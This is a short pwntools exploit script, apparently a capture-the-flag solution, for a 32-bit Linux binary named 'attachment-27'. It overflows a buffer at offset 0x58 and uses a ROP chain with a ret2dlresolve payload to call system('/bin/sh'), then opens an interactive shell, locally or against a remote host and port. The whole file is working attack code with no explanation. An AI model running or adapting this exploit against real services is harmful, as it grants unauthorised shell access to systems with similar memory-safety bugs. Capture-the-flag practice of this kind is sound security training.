from pwn import *

context(arch="i386", os="linux", log_level="debug")

elf = ELF("./attachment-27")


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 1337)
        return remote(host, port)
    return process(elf.path)


io = start()

offset = 0x58
rw_base = elf.bss() + 0x100

# consume banner printed in prologue
io.recvline(timeout=1)

dlresolve = Ret2dlresolvePayload(
    elf, symbol="system", args=["/bin/sh"], data_addr=rw_base
)

rop = ROP(elf)
rop.read(0, rw_base, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

payload1 = b"A" * offset + rop.chain()
io.send(payload1)
io.send(dlresolve.payload)

io.interactive()
